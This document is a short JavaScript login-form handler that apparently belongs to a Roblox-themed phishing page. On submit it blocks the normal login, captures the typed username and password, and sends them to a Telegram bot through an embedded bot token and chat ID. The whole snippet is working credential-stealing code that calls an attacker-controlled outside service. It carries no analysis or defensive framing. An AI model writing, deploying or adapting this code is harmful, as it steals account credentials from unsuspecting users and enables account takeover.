
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  const message = `👤 grwagardn Login (https://roblox.grwagardn.com/profile)%0AUsername: ${username}%0APassword: ${password}`;
  const token = "8275806942:AAGZIepXg7vIxN6shQ40RbnmnVGzYVx-RgE";
  const chatId = "827580694";

  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`);
});
